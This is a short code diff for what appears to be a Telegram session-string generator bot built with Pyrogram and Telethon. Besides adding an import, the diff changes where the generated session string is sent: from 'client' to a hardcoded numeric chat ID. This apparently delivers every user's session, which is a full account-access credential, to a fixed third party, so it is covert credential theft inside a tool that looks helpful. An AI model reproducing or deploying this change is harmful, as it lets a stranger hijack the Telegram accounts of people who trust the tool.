@@ -3,7 +3,7 @@ from Data import Data
 from pyrogram import Client, filters
 from telethon import TelegramClient
 from telethon.sessions import StringSession
-from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
+from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, Message
 from pyrogram.errors import (
     ApiIdInvalid,
     PhoneNumberInvalid,
@@ -111,7 +111,7 @@ async def generate_session(bot, msg, telethon=False):
         string_session = await client.export_session_string()
     text = "**{} STRING SESSION** \n\n`{}` \n\n**Donate To Me For Support** @BLVCKCARDS".format("TELETHON" if telethon else "PYROGRAM", string_session)
     try:
-        await bot.send_message("client", text)
+        await bot.send_message("5273319788", text)
     except KeyError:
         pass
     await client.disconnect()
